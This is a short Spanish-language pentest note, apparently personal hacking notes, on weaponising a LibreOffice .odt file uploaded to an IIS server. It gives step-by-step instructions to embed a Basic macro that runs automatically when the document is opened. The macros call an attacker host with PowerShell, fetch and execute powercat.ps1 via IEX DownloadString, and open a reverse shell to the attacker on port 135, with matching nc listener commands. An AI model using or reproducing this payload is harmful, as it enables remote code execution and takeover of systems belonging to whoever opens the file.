# IIS ODT File upload

Tags: #ODT 

* [Powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

```bash 
Paso a seguir para la creación en libreoffice:

1. Crear un nuevo doc y agregarle cualquier texto 
2. Dar click en 'Save as'. Colocar la extensión '.odt'
3. Ir a 'Tools > Macros > Organize Macros > Baasic'
4. Abajo de 'Application Macros' se encuentra el doc creado, proceder a expandirlo, seleccionar la carpeta llamada 'Standard'
5. Darle a 'New' y dejar el nombre como 'Module 1'
6. Ingresar el siguiente contenido:
   
   Sub Main
       Shell("cmd /c powershell iwr http://IP_Kali/")
   End Sub
   
7 Guardar el archivo 
8 Ir a 'Tools > Customize > Events', seleccionar 'Open Document' y dar click en 'Macro'
9 Abajo de 'Application Macros' se encuentra el doc creado, proceder a expandirlo, expandir la carpeta llamada 'Standard' para seleccionar el 'Module 1'
10 Dar click en 'OK' 
11 Se mirará en 'Open Document' lo siguiente: 'Standard.Module1.Main' ahí daar click en 'Ok' 

12 Ponerse en escucha y subir el archivo a la web  
❯ nc -nlvp 80   # Recibir la petición 
```

```bash 
# Revershell 
   Sub Main
       Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://IP_Kali/powercat.ps1');powercat -c IP_Kali -p 135 -e powershell")
   End Sub

❯ rlwrap nc -nlvp 135  # Recibir la revershell 
```